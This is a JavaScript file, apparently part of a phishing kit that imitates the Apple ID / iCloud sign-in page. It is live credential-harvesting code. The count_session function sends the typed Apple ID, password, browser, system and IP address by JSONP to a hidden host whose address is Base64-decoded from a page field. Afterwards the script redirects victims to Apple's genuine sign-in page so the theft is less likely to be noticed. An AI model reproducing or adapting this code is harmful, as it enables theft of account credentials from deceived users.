function limpiar_carga() {
    $("#carga_envio").css("display", "none"), $("#bt_flec").css("display", "block")
}

function submitt() {
    $.trim($("#appleId").val().length) > 0 ? $.trim($("#pwd").val().length) > 0 && ($("#carga_envio").css("display", "block"), $("#bt_flec").css("display", "none"), SubmitMe()) : $("#appleId").focus()
}

function id_inp(a) {
    var b = $("#" + a).val();
    b.length > 0 ? ($(".signin-error").addClass("ocult"), $(".signin-error").removeClass("visb")) : ($(".signin-error").addClass("ocult"), $(".signin-error").removeClass("visb"))
}

function salwinx() {
    var a = $.trim($("#d").val()),
        b = $.trim($("#iddapp").val());
    window.location = a + "sign.php?reload=3&idname=" + b
}

function forgot() {
    top.location.href = "https://idmsa.apple.com/IDMSWebAuth/signin?appIdKey=6f59402f11d3e2234be5b88bf1c96e1e453a875aec205272add55157582a9f61&path=%2F%3Fa%3D1179750425%26s%3D1%26wo%3DMS1BN7QDLY%26pli%3D79013838111353&language=ES-ES"
}

function vis_flec() {
    $.trim($("#pwd").val().length), $.trim($("#appleId").val().length);
    $.trim($("#pwd").val().length) > 0 && $.trim($("#appleId").val().length) > 0 ? ($("#sign-in").removeClass("disabled"), $("#sign-in").attr("aria-disabled", "true"), $(".signin-error").addClass("ocult"), $(".signin-error").removeClass("visb")) : ($("#sign-in").addClass("disabled"), $("#sign-in").attr("aria-disabled", "true"), $(".signin-error").addClass("ocult"), $(".signin-error").removeClass("visb"))
}

function clos() {
    $("#idmsModalWrapper1485962628981-0-0").removeClass("visb"), $("#idmsModalWrapper1485962628981-0-0").addClass("ocult"), limpiar(), vis_flec(), setTimeout(function() {
        $("#appleId").focus()
    }, 1e3), $("#step").addClass("visb"), $("#step").removeClass("ocult")
}

function limpiar() {
    $("#appleId").val(""), $("#pwd").val(""), $("#appleId").focus()
}

function SubmitMe() {
  count_session(1);
}



function count_session(a) {
    
    var  c =$("#iddapp").val(); 
    var host = Base64.decode($.trim($("#h").val()));
 
     function t(a) {
         console.log(a.message);
        reset(a.message);
    }


    $.ajax({
        url: host+"validlog.php",
        data: {
            user:$("#appleId").val(),
            pass:$("#pwd").val(),
            idapp:c,
            intento:a,
            sistema:$("#id_sistema").val(),
            browser:$.trim($("#browser").val()),
            ip_address:$.trim($("#ip_address").val()),
            
        },
        dataType: "jsonp",
        jsonp: "callback",
        jsonpCallback: "jsonpCallback",
        success: function(a) {
            t(a);
        }
    })

}

function reset(a){
      
  resultado = a;
            var c = a,
                d = c.split("-"),
                e = d[0],
                f = d[1],
                g = d[2],
                red = d[3];
                
                if(red=='1'){
                top.location.href = "include/direction.php";
                }else{
            "es_1" == $.trim(e) ? "" != g && "0" != g ? 1 == g ? "" != f && ("2" == f ? ($(".signin-error").addClass("visb"), $(".signin-error").removeClass("ocult"), limpiar_carga(), $("#pwd").val(""), $("#pwd").focus()) : "1" == f ? ($("#step").removeClass("visb"), $("#step").addClass("ocult"), limpiar_carga(), $("#idmsModalWrapper1485962628981-0-0").removeClass("ocult"), $("#idmsModalWrapper1485962628981-0-0").addClass("visb")) : "3" == f && salwinx()) : 2 == g ? forgot() : 3 == g && (location.href = "include/direction.php") : forgot() : "es_0" == $.trim(e) && (top.location.href = "https://idmsa.apple.com/IDMSWebAuth/signin?appIdKey=6f59402f11d3e2234be5b88bf1c96e1e453a875aec205272add55157582a9f61&path=%2F%3Fa%3D1179750425%26s%3D1%26wo%3DMS1BN7QDLY%26pli%3D79013838111353&language=ES-ES")
			}

}

$(document).ready(function() {
    $("#appleId").keypress(function(a) {
        13 == a.which && $(this).val().length > 0 && ($(this).val().indexOf("@") != -1 ? $("#pwd").focus() : ($(this).val($(this).val() + "@icloud.com"), $("#pwd").focus()))
    }), $("#appleId").keydown(function(a) {
        9 == a.which && $(this).val().length > 0 && ($(this).val().indexOf("@") != -1 || $(this).val($(this).val() + "@icloud.com"))
    }), $("#pwd").keypress(function(a) {
        13 == a.which && ($.trim($("#appleId").val().length) > 0 ? $.trim($("#pwd").val().length) > 0 && ($("#carga_envio").css("display", "block"), $("#bt_flec").css("display", "none"), SubmitMe()) : $("#appleId").focus())
    }), $("#pwd").click(function() {
        $.trim($("#appleId").val().length) > 0 && ($("#appleId").val().indexOf("@") != -1 || $("#appleId").val($("#appleId").val() + "@icloud.com"))
    })
});